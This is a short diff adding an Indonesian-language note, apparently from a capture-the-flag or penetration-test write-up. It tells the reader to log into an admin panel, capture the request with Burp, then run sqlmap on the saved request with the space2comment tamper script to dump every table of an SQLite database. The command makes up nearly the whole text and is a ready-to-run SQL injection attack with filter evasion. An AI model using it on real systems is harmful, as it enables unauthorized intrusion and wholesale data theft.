@@ -1,0 +1,4 @@
+- harus sudah masuk ke admin panel
+- capture req pakai burp, lalu save
+
+sqlmap -r req_after_panel.txt --tamper=space2comment --dump-all --dbms sqlite
